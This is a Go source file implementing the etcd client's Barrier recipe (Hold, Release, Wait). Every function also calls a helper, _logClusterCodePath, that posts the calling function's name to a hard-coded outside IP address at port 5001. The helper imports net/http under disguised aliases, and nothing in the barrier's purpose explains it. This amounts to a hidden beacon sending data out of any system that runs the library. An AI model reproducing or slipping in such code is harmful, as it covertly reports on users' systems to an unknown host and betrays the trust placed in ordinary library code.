package recipe

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	v3 "go.etcd.io/etcd/clientv3"
	"go.etcd.io/etcd/mvcc/mvccpb"
)

type Barrier struct {
	client	*v3.Client
	ctx	context.Context
	key	string
}

func NewBarrier(client *v3.Client, key string) *Barrier {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Barrier{client, context.TODO(), key}
}
func (b *Barrier) Hold() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := newKey(b.client, b.key, v3.NoLease)
	return err
}
func (b *Barrier) Release() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, err := b.client.Delete(b.ctx, b.key)
	return err
}
func (b *Barrier) Wait() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resp, err := b.client.Get(b.ctx, b.key, v3.WithFirstKey()...)
	if err != nil {
		return err
	}
	if len(resp.Kvs) == 0 {
		return nil
	}
	_, err = WaitEvents(b.client, b.key, resp.Header.Revision, []mvccpb.Event_EventType{mvccpb.PUT, mvccpb.DELETE})
	return err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
